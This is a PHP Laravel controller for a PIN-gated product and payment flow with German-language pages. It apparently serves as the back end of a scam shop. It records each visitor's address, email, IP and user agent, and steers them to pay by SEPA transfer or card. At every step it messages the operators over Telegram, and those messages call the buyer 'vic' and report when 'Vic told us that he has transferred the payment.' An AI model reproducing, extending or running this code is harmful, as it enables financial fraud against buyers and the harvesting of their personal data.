<?php

namespace App\Http\Controllers;

use App\Models\DeliveryAddress;
use App\Models\PaymentMethod;
use App\Models\PaymentSession;
use App\Models\ProductPage;
use App\Services\TelegramService;
use Illuminate\Http\Request;
use Inertia\Inertia;
use Session;
use Str;
use Validator;
use function to_route;

class FrontendController extends Controller
{

    public function index()
    {
        return Inertia::render('Home');
    }

    public function enterPin(Request $request)
    {
        $pin = $request->input('pin');
        $productPage = ProductPage::where('pin_code', '=', $pin)->first();

        if ($productPage == null) {
            return Inertia::render('Home', [
                'error' => 'Der Pin-Code existiert nicht oder ist abgelaufen!',
            ]);
        }

        $confirmed = Session::get('confirmed.' . Str::lower($pin));
        if ($confirmed) {
            return to_route('payed', ['pin' => $pin]);
        }

        $paymentSession = $this->getOrCreatePaymentSession($productPage, PaymentSession::STATUS_PIN_ENTERED);

        app(TelegramService::class)->sendMessageWithUrlButtonSilentToAdmins(
            Str::replace('_', '\_', "*PIN entered*\n\nNew payment session created for vic. Now he adds his delivery address.\n\n*Product:* {$paymentSession->productPage->title}\n*PIN:* {$pin}\n*Status:* {$paymentSession->status}\n*IP:* {$paymentSession->ip}"),
            'Open Admin Panel',
            $paymentSession->getNovaUrl()
        );

        return to_route('pin', ['pin' => $pin]);
    }

    public function showProduct($pin)
    {
        $productPage = ProductPage::where('pin_code', '=', $pin)->first();

        if ($productPage == null) {
            return Inertia::render('Home', [
                'error' => 'Der Pin-Code existiert nicht oder ist abgelaufen!',
            ]);
        }

        $confirmed = Session::get('confirmed.' . Str::lower($pin));
        if ($confirmed) {
            return to_route('payed', ['pin' => $pin]);
        }

        $this->getOrCreatePaymentSession($productPage, PaymentSession::STATUS_PIN_ENTERED);

        return Inertia::render('Product', [
            'pin' => $pin,
            'productPage' => $productPage,
            'imageLinks' => $productPage->getOrderedImageLinks(),
        ]);
    }

    public function selectMethod(Request $request, $pin)
    {
        $productPage = ProductPage::where('pin_code', '=', $pin)->first();

        if ($productPage == null) {
            return Inertia::render('Home', [
                'error' => 'Der Pin-Code existiert nicht oder ist abgelaufen!',
            ]);
        }

        $confirmed = Session::get('confirmed.' . Str::lower($pin));
        if ($confirmed) {
            return to_route('payed', ['pin' => $pin]);
        }

        $paymentSession = $this->getOrCreatePaymentSession($productPage, PaymentSession::STATUS_SELECT_METHOD);

        $data = $request->all();

        $validator = Validator::make($data, [
            'firstname' => 'required|string|min:2|max:100',
            'lastname' => 'required|string|min:2|max:100',
            'address' => 'required|string|min:2|max:300',
            'zip' => 'required|string|min:5|max:20',
            'city' => 'required|string|min:2|max:100',
            'country' => 'required|string|min:2|max:100',
            'email' => 'required|string|email|min:2|max:300',
        ]);

        if ($validator->fails()) {
            return Inertia::render('Product', [
                'pin' => $pin,
                'productPage' => $productPage,
                'imageLinks' => $productPage->getOrderedImageLinks(),
                'errors' => $validator->errors(),
            ]);
        }

        DeliveryAddress::create([
            ...$data,
            'payment_session_id' => $paymentSession->id,
        ]);

        $paymentSession->status = PaymentSession::STATUS_SELECT_METHOD;
        $paymentSession->save();

        $data['payment_session_id'] = $paymentSession->id;

        Session::put('data.' . Str::lower($pin), $data);

        app(TelegramService::class)->sendMessageWithUrlButtonSilentToAdmins(
            Str::replace('_', '\_', "*Delivery address entered*\n\nVic has added his delivery address. Now he selects the payment method.\n\n*Product:* {$paymentSession->productPage->title}\n*PIN:* {$pin}\n*Status:* {$paymentSession->status}\n*IP:* {$paymentSession->ip}"),
            'Open Admin Panel',
            $paymentSession->getNovaUrl()
        );

        return to_route('select-method', ['pin' => $pin]);
    }

    public function showSelectMethod(Request $request, $pin)
    {
        $productPage = ProductPage::where('pin_code', '=', $pin)->first();

        if ($productPage == null) {
            return Inertia::render('Home', [
                'error' => 'Der Pin-Code existiert nicht oder ist abgelaufen!',
            ]);
        }

        $confirmed = Session::get('confirmed.' . Str::lower($pin));
        if ($confirmed) {
            return to_route('payed', ['pin' => $pin]);
        }

        $data = Session::get('data.' . Str::lower($pin));
        if (empty($data)) {
            return to_route('pin', ['pin' => $pin]);
        }

        return Inertia::render('SelectPaymentMethod', [
            'pin' => $pin,
            'productPage' => $productPage,
            'imageLinks' => $productPage->getOrderedImageLinks(),
            'data' => $data,
        ]);
    }

    public function payProduct(Request $request, $pin)
    {
        $productPage = ProductPage::where('pin_code', '=', $pin)->first();

        if ($productPage == null) {
            return Inertia::render('Home', [
                'error' => 'Der Pin-Code existiert nicht oder ist abgelaufen!',
            ]);
        }

        $confirmed = Session::get('confirmed.' . Str::lower($pin));
        if ($confirmed) {
            return to_route('payed', ['pin' => $pin]);
        }

        $data = Session::get('data.' . Str::lower($pin));
        if (empty($data)) {
            return to_route('pin', ['pin' => $pin]);
        }

        $paymentSession = $this->getOrCreatePaymentSession($productPage, PaymentSession::STATUS_METHOD_SELECTED);

        $paymentMethod = $request->input('method', 'sepa');

        switch ($paymentMethod) {
            case 'cc':
                $paymentMethodVal = PaymentMethod::METHOD_CREDIT_CARD;
                break;
            case 'sepa':
            default:
                $paymentMethodVal = PaymentMethod::METHOD_SEPA;
        }

        PaymentMethod::create([
            'payment_session_id' => $paymentSession->id,
            'method' => $paymentMethodVal,
        ]);

        $paymentSession->status = PaymentSession::STATUS_METHOD_SELECTED;
        $paymentSession->save();

        Session::put('payment_method.' . Str::lower($pin), $paymentMethodVal);

        $tgPaymethMethod = Str::upper(Str::replace('_', ' ', $paymentMethodVal));

        app(TelegramService::class)->sendMessageWithUrlButtonSilentToAdmins(
            Str::replace('_', '\_', "*{$tgPaymethMethod} selected*\n\nVic has selected his payment method ({$paymentMethodVal}). Now he has to pay.\n\n*Product:* {$paymentSession->productPage->title}\n*PIN:* {$pin}\n*Status:* {$paymentSession->status}\n*IP:* {$paymentSession->ip}"),
            'Open Admin Panel',
            $paymentSession->getNovaUrl()
        );

        return to_route('pay', ['pin' => $pin]);
    }

    public function showPayment(Request $request, $pin)
    {
        $productPage = ProductPage::where('pin_code', '=', $pin)->first();

        if ($productPage == null) {
            return Inertia::render('Home', [
                'error' => 'Der Pin-Code existiert nicht oder ist abgelaufen!',
            ]);
        }

        $confirmed = Session::get('confirmed.' . Str::lower($pin));
        if ($confirmed) {
            return to_route('payed', ['pin' => $pin]);
        }

        $data = Session::get('data.' . Str::lower($pin));
        if (empty($data)) {
            return to_route('pin', ['pin' => $pin]);
        }

        $method = Session::get('payment_method.' . Str::lower($pin));
        if (empty($method) || !in_array($method, [PaymentMethod::METHOD_SEPA, PaymentMethod::METHOD_CREDIT_CARD])) {
            return to_route('select-method', ['pin' => $pin]);
        }

        if ($method == PaymentMethod::METHOD_SEPA) {
            $ineritaComponent = 'Pay';
        } elseif ($method == PaymentMethod::METHOD_CREDIT_CARD) {
            $ineritaComponent = 'PayWithCc';
        }

        return Inertia::render($ineritaComponent, [
            'pin' => $pin,
            'productPage' => $productPage,
            'imageLinks' => $productPage->getOrderedImageLinks(),
            'data' => $data,
        ]);
    }

    public function confirmPayment($pin)
    {
        $productPage = ProductPage::where('pin_code', '=', $pin)->first();

        if ($productPage == null) {
            return Inertia::render('Home', [
                'error' => 'Der Pin-Code existiert nicht oder ist abgelaufen!',
            ]);
        }

        $paymentSession = $this->getOrCreatePaymentSession($productPage, PaymentSession::STATUS_PAYED);

        Session::put('confirmed.' . Str::lower($pin), true);

        app(TelegramService::class)->sendMessageWithUrlButtonSilentToAdmins(
            Str::replace('_', '\_', "*Payment done*\n\nVic told us that he has transferred the payment.\n\n*Product:* {$paymentSession->productPage->title}\n*PIN:* {$pin}\n*Status:* {$paymentSession->status}\n*IP:* {$paymentSession->ip}"),
            'Open Admin Panel',
            $paymentSession->getNovaUrl()
        );

        return to_route('payed', ['pin' => $pin]);
    }

    public function showConfirmation($pin)
    {
        $productPage = ProductPage::where('pin_code', '=', $pin)->first();

        if ($productPage == null) {
            return Inertia::render('Home', [
                'error' => 'Der Pin-Code existiert nicht oder ist abgelaufen!',
            ]);
        }

        $confirmed = Session::get('confirmed.' . Str::lower($pin));
        if (empty($confirmed)) {
            return to_route('pay', ['pin' => $pin]);
        }

        $this->getOrCreatePaymentSession($productPage, PaymentSession::STATUS_PAYED);

        return Inertia::render('Confirmed', [
            'pin' => $pin,
            'productPage' => $productPage,
            'imageLinks' => $productPage->getOrderedImageLinks(),
        ]);
    }

    private function getOrCreatePaymentSession(ProductPage $productPage, $status): PaymentSession
    {
        $paymentSessionId = Session::get('payment_session.' . Str::lower($productPage->pin_code));
        $paymentSession = PaymentSession::find($paymentSessionId);

        if ($paymentSession == null) {
            $paymentSession = PaymentSession::create([
                'product_page_id' => $productPage->id,
                'status' => $status,
                'ip' => \Request::getClientIp(),
                'user_agent' => \Request::userAgent(),
            ]);

            Session::put('payment_session.' . Str::lower($productPage->pin_code), $paymentSession->id);
        } else {
            $paymentSession->status = $status;
            $paymentSession->ip = \Request::getClientIp();
            $paymentSession->user_agent = \Request::userAgent();
            $paymentSession->save();
        }

        return $paymentSession;
    }

}
